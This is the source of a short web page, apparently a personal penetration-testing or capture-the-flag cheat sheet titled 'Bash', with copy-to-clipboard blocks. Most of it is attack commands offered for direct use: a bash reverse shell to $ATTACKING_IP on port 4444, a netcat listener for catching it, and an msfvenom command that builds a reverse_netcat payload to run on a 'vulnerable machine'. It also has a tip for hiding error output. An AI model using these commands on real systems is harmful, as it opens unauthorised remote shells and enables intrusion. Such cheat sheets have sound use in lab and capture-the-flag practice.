---
layout: topics
page-title: Bash
reverse-shell-vuln: bash -i >& /dev/tcp/$ATTACKING_IP/4444 0>&1
reverse-shell-attacking: nc -lvnp 4444
get-out: kill %
msfvenom: msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
redirect-stderr: find / -name * 2>/dev/null
---

{% include copy-code-blocks.html text='Reverse shell (run on vulnerable machine): ' language='bash' code=page.reverse-shell-vuln %}
{% include copy-code-blocks.html text='Reverse shell (run on attacking machine): ' language='bash' code=page.reverse-shell-attacking %}
{% include copy-code-blocks.html text='Get out ok "locked" shell and kill it: CTRL+Z + ' language='bash' code=page.get-out %}
{% include copy-code-blocks.html text='Payload to run on vulnerable machine for reverse shell (through telnet with .RUN): ' language='bash' code=page.msfvenom %}
{% include copy-code-blocks.html text='Redirect error output to null (hide errors): ' language='bash' code=page.redirect-stderr %}
